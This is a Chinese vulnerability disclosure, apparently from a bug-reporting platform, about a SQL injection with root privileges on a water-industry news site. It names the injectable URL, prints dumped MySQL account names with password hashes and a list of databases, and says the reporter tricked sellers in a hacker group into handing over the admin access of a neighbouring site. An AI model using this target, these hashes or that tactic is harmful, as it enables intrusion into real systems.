漏洞详情 披露状态：   									2014-08-15：	积极联系厂商并且等待厂商认领中，细节不对外公开									2014-09-29：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： - -。注入，root权限的注入点，权4，搜狗新闻源，同服站点权2，搜狗新闻源！ 详细说明：  注入点：http://b.chinacitywater.org/news_list.php?c=7   root权限哦，邻居站点也遭受池鱼！另外我看到有黑产牛在群里叫卖后台权限，最好彻底清查下网站漏洞  注入肯定不止一处.   漏洞证明：  Current User: 	chunguang@localhostSql Version: 	5.1.73-1Current DB: 	waterb2bSystem User: 	chunguang@localhostHost Name: 	wod189Installation dir: 	/usr/DB User & Pass: 	root:*8D78D917B3701681D3B10334C76FDC12B494D0A8:localhost		root:*8D78D917B3701681D3B10334C76FDC12B494D0A8:wod189		root:*8D78D917B3701681D3B10334C76FDC12B494D0A8:127.0.0.1		debian-sys-maint:*5E91AEB328E86037F90AB8162BECA5D243F5C5B3:localhost		chunguang:*8D78D917B3701681D3B10334C76FDC12B494D0A8:%		wdmeet:*7B323F8C475D66A9DC26BFD1F742AAFDDDD843F4:localhost		con_chinagb:*7B323F8C475D66A9DC26BFD1F742AAFDDDD843F4:%Data Bases: 	information_schema		chinaecoc		chinagb_b2b		chinagb_bbs		chinagb_business		chinarockart		chinasus_oa		chinasus_post		cityup_bbs		con_chinagb		ctv		gbrc_bbs		gbrc_cms		hw_system		kding		meet		mysql		sail		water_hudong		waterb2b		wd_project		wdmeet		wod_meeting这站是我在某黑客群里看见有人出售，- -，经过一番忽悠，搞到了同服另外一站的后台登陆权限http://www.chinagb.net/admin/
